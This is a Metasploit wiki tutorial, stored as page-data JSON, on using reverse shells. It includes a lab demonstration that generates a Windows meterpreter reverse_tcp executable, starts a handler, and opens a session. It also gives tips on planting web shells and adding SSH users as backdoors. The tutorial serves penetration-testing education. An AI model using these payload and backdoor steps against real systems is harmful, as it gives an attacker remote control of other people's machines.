{"componentChunkName":"component---src-templates-wiki-template-tsx","path":"/wiki/Resources/How-to-use-a-reverse-shell-in-Metasploit","result":{"data":{"markdownRemark":{"id":"816e2b9f-8dbb-5eb2-bdd9-8a2f9302d245","frontmatter":{"title":"How to use a reverse shell in Metasploit","root":null},"html":"<p>There are two popular types of shells: bind and reverse. A bind shell is the kind that opens up a new service on the target machine, and requires the attacker to connect to it in order to get a session. A reverse shell (also known as a connect-back) is the exact opposite: it requires the attacker to set up a listener first on his box, the target machine acts as a client connecting to that listener, and then finally the attacker receives the shell.</p>\n<p>The basic usage of payloads is already quite well documented in the <a href=\"https://github.com/rapid7/metasploit-framework/blob/master/documentation/users_guide_4.3.pdf\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Users Guide</a> in Metasploit's documentation folder. However, learning how to use a reverse shell still remains the most common question in the Metasploit community. Plus, 9 times out of 10 you'd probably be using a reverse shell to get a session, so in this wiki documentation we will explain more about this.</p>\n<h2 id=\"list-of-metasploit-reverse-shells\" style=\"position:relative;\"><a href=\"#list-of-metasploit-reverse-shells\" aria-label=\"list of metasploit reverse shells permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>List of Metasploit reverse shells</h2>\n<p>As of now, there are 168 different reverse shells in the Metasploit Framework. We will not list all of them here, because that's just straight up spamming. But if you'd like, you can run the following command to get msfpayload to tell you:</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">./msfpayload -l <span class=\"token operator\">|</span><span class=\"token function\">grep</span> reverse</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>As a rule of thumb, always pick a meterpreter, because it currently provides better support of post exploitation Metasploit has to offer. For example, railgun, post modules, unique meterpreter commands (like webcam controls), etc.</p>\n<p>In Windows, the most commonly used reverse shell is windows/meterpreter/reverse. But you can also try windows/meterpreter/reverse<em>http or windows/meterpreter/reverse</em>https, because their network traffic appear a little bit less abnormal.</p>\n<p>In Linux, you can also try linux/x86/meterpreter/reverse<em>tcp, or the 64-bit one. However, just know that linux/x86/shell</em>reverse_tcp has been the most stable.</p>\n<h2 id=\"when-to-use-a-reverse-shell\" style=\"position:relative;\"><a href=\"#when-to-use-a-reverse-shell\" aria-label=\"when to use a reverse shell permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>When to use a reverse shell</h2>\n<p>If you find yourself in one of the following scenarios (but not limited to), then you should consider using a reverse shell:</p>\n<ul>\n<li>The target machine is behind a different private network.</li>\n<li>The target machine's firewall blocks incoming connection attempts to your bindshell.</li>\n<li>Your payload is unable to bind to the port it wants due to whatever reason.</li>\n<li>You simply can't decide what to choose.</li>\n</ul>\n<h2 id=\"when-a-reverse-shell-isnt-needed\" style=\"position:relative;\"><a href=\"#when-a-reverse-shell-isnt-needed\" aria-label=\"when a reverse shell isnt needed permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>When a reverse shell isn't needed</h2>\n<p>Generally speaking, if you can backdoor an existing service, you may not need a reverse shell. For example: if the target machine is already running a SSH server, then you can try adding a new user to it and use that.</p>\n<p>If the target machine is running a web server that supports a server-side programming language, then you can leave a backdoor in that language. For example, many Apache servers support PHP, then you can use a PHP \"web shell\". IIS servers usually support ASP, or ASP.net. The Metasploit Framework offers payloads in all these languages (and many others).</p>\n<p>Same thing for VNC, remote desktop, SMB (psexec), or other remote admin tools, etc.</p>\n<h2 id=\"how-to-set-up-for-a-reverse-shell-during-payload-generation\" style=\"position:relative;\"><a href=\"#how-to-set-up-for-a-reverse-shell-during-payload-generation\" aria-label=\"how to set up for a reverse shell during payload generation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>How to set up for a reverse shell during payload generation</h2>\n<p>When you generate a reverse shell with either msfpayload or msfvenom, you must know how to configure the following:</p>\n<ul>\n<li><strong>LHOST</strong> - This is the IP address you want your target machine to connect to, literally. If you're in a local area network, it is unlikely your target machine can actually reach you unless you both are in the same network. In that case, you will have to <a href=\"https://www.google.com/webhp?q=ip#q=ip\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">find out your public-facing IP address</a>, and then configure your network to port-forward that connection to your box. LHOST should not be \"localhost\", or \"0.0.0.0\", or \"127.0.0.1\", because if you do, you're telling the target machine to connect to itself (or it may not work at all).</li>\n<li><strong>LPORT</strong> - This the port you want your target machine to connect to.</li>\n</ul>\n<p>When you set up a listener for the reverse shell, you also at least need to configure LHOST and LPORT, but slightly different meanings (different perspective):</p>\n<ul>\n<li><strong>LHOST</strong> - This is the IP address you want your listener to bind to.</li>\n<li><strong>LPORT</strong> - This is the port you want your listener to bind to.</li>\n</ul>\n<p>You should make sure the listener has started first before executing the reverse shell.</p>\n<h2 id=\"demonstration\" style=\"position:relative;\"><a href=\"#demonstration\" aria-label=\"demonstration permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Demonstration</h2>\n<p>In this demonstration, we have two boxes:</p>\n<p><strong>Box A:</strong></p>\n<ul>\n<li>The attacker's box that receives the payload session</li>\n<li>IP is: 192.168.1.123 (ifconfig)</li>\n<li>On the same network as the victim machine</li>\n</ul>\n<p><strong>Box B:</strong></p>\n<ul>\n<li>The \"victim\" machine</li>\n<li>Windows XP</li>\n<li>IP is: 192.168.1.80 (ipconfig)</li>\n<li>On the same network as the attacker machine</li>\n<li>For testing purposes, no antivirus enabled.</li>\n<li>For testing purposes, no firewall enabled, either.</li>\n</ul>\n<p><strong>Step 1: I generate my executable payload:</strong></p>\n<p>On the attacker's box, I run msfpayload like the following (or msfvenom, whatever you prefer):</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ ./msfpayload windows/meterpreter/reverse_tcp <span class=\"token assign-left variable\">lhost</span><span class=\"token operator\">=</span><span class=\"token number\">192.168</span>.1.123 <span class=\"token assign-left variable\">lport</span><span class=\"token operator\">=</span><span class=\"token number\">4444</span> X <span class=\"token operator\">></span> /tmp/iambad.exe\nCreated by msfpayload <span class=\"token punctuation\">(</span>http://www.metasploit.com<span class=\"token punctuation\">)</span>.\nPayload: windows/meterpreter/reverse_tcp\nLength: <span class=\"token number\">287</span>\nOptions: <span class=\"token punctuation\">{</span><span class=\"token string\">\"LHOST\"</span><span class=\"token operator\">=</span><span class=\"token operator\">></span><span class=\"token string\">\"192.168.1.123\"</span>, <span class=\"token string\">\"LPORT\"</span><span class=\"token operator\">=</span><span class=\"token operator\">></span><span class=\"token string\">\"4444\"</span><span class=\"token punctuation\">}</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p><strong>Step 2: I copy my executable payload to Box B (my victim machine)</strong></p>\n<p>This step requires no further explanation.</p>\n<p><strong>Step 3: I set up my payload handler on box A (the attacker's box):</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ ./msfconsole -q\nmsf <span class=\"token operator\">></span> use exploit/multi/handler\nmsf exploit<span class=\"token punctuation\">(</span>handler<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token builtin class-name\">set</span> payload windows/meterpreter/reverse_tcp\npayload <span class=\"token operator\">=</span><span class=\"token operator\">></span> windows/meterpreter/reverse_tcp\nmsf exploit<span class=\"token punctuation\">(</span>handler<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token builtin class-name\">set</span> lhost <span class=\"token number\">192.168</span>.1.123\nlhost <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token number\">192.168</span>.1.123\nmsf exploit<span class=\"token punctuation\">(</span>handler<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token builtin class-name\">set</span> lport <span class=\"token number\">4444</span>\nlport <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token number\">4444</span>\nmsf exploit<span class=\"token punctuation\">(</span>handler<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> run\n\n<span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Started reverse handler on <span class=\"token number\">192.168</span>.1.123:4444\n<span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Starting the payload handler<span class=\"token punctuation\">..</span>.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p><strong>Step 4: I double-click on the malicious executable</strong></p>\n<p>This step requires no further explanation.</p>\n<p><strong>Step 5: I should see a meterpreter/payload session on box A (the attacker's box)</strong></p>\n<p>Like this:</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ ./msfconsole -q\nmsf <span class=\"token operator\">></span> use exploit/multi/handler\nmsf exploit<span class=\"token punctuation\">(</span>handler<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token builtin class-name\">set</span> payload windows/meterpreter/reverse_tcp\npayload <span class=\"token operator\">=</span><span class=\"token operator\">></span> windows/meterpreter/reverse_tcp\nmsf exploit<span class=\"token punctuation\">(</span>handler<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token builtin class-name\">set</span> lhost <span class=\"token number\">192.168</span>.1.123\nlhost <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token number\">192.168</span>.1.123\nmsf exploit<span class=\"token punctuation\">(</span>handler<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token builtin class-name\">set</span> lport <span class=\"token number\">4444</span>\nlport <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token number\">4444</span>\nmsf exploit<span class=\"token punctuation\">(</span>handler<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> run\n\n<span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Started reverse handler on <span class=\"token number\">192.168</span>.1.123:4444\n<span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Starting the payload handler<span class=\"token punctuation\">..</span>.\n<span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Sending stage <span class=\"token punctuation\">(</span><span class=\"token number\">770048</span> bytes<span class=\"token punctuation\">)</span> to <span class=\"token number\">192.168</span>.1.80\n<span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Meterpreter session <span class=\"token number\">1</span> opened <span class=\"token punctuation\">(</span><span class=\"token number\">192.168</span>.1.123:4444 -<span class=\"token operator\">></span> <span class=\"token number\">192.168</span>.1.80:1138<span class=\"token punctuation\">)</span> at <span class=\"token number\">2014</span>-10-22 <span class=\"token number\">19</span>:03:43 -0500\nmeterpreter <span class=\"token operator\">></span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>The meterpreter prompt means you are currently interacting with the payload.</p>"}},"pageContext":{"id":"816e2b9f-8dbb-5eb2-bdd9-8a2f9302d245"}}}